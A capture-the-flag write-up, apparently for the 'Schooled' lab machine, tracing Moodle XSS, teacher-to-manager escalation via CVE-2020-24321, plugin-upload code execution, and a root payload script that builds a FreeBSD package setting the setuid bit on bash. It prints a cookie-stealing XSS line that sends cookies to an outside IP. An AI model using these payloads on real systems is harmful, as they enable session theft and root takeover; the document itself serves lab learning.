    Moodle enumeration

    When logging in we notice we need to add a student.schooled.htb email address:

    This email is not one of those that are allowed (student.schooled.htb) and upon logging in we see that there is also staff.schooled.htb available. Furthermore we are allowed to enroll to the Maths course and read an Announcement by Manuel Phillips (phillips_manuel@staff.schooled.htb) asking us to set a “MoodleNet profile”: This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.

    Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.

    Searching this term shows serious XSS vulnerabilities and we can test this by browsing to our profile page and setting <script>alert(1)</script> as MoodleNet profile. And indeed when browsing to our profile we are greeted by our beloved alert(1) message. What’s XSS good for? For example for cookie stealing - and this is achieved quite simply:

    <img src=x onerror=this.src='http://10.10.14.11:8000/?c='+document.cookie>

    From teacher to manager to RCE

    We pretty much follow the CVE-2020-24321 outlined in detail here. After catching and modifying the enroll request for Lianne Carter and logging in as her we see the button Site administration on the bottom left hand side. This is a sure sign that we are on the right track. Then:

    -> Users -> Define Roles -> Manager -> Edit -> Scrolling all the way down -> Turn intercept on in Burp -> Save changes in moodle -> replace the huge payload after &return=... with the payload from the author’s github page.

    Having done that we can gain RCE by installing a plugin. We do this following these steps: Site administration -> Plugins -> Install plugins -> Choose a file… -> Upload a file -> Choose file -> rce.zip -> upload this file -> Install plugin from the ZIP file Browsing to http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami should now display the user www.

    We need to be quick now because our php file that gives us rce will disappear relatively fast. First I did not manage to get a reverse shell and enumerated manually using this small shell. The config.php file from moodle revealed mysql creds:

$CFG->dbuser    = 'moodle';

$CFG->prefix    = 'mdl_';

    As the box is using FreeBSD 13 amd 64 we browse to here to get and host these three files. After having done that, we need to find out how to create a .pkg file that does what we want. Luckily there is this page which we basically only have to copy and paste from. Go check out his page for more details. The full exploit is down below. Usually I would maybe cat the root flag somewhere or send a reverse shell but this time I wanted to try something cool, which is inspired by xct who likes to set the setuid bit on bash. So I changed

    pw usermod -n root -s /bin/csh
# to
chmod u+s /bin/bash

    and executed quickly (the files will be deleted very frequently) the following steps:

    • safe the payload to /tmp/payload.sh
    • run sh /tmp/payload.sh that creates the file /tmp/mypackage-1.0_5.txz
    • safe the edited /etc/hosts that contains my IP
    • run $ sudo /usr/sbin/pkg install /tmp/mypackage-1.0_5.txz and confirm to install

    Full root payload

    #!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
# careful here, this may clobber your system
echo "Resetting root shell"
chmod u+s /bin/bash
EOF

cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo "Registering root shell"
chmod u+s /bin/bash
EOF

cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF

echo "deps: {" >> ${STAGEDIR}/+MANIFEST
pkg query "  %n: { version: \"%v\", origin: %o }" portlint >> ${STAGEDIR}/+MANIFEST
pkg query "  %n: { version: \"%v\", origin: %o }" poudriere >> ${STAGEDIR}/+MANIFEST
echo "}" >> ${STAGEDIR}/+MANIFEST

mkdir -p ${STAGEDIR}/usr/local/etc
echo "# hello world" > ${STAGEDIR}/usr/local/etc/my.conf
echo "/usr/local/etc/my.conf" > ${STAGEDIR}/plist

pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
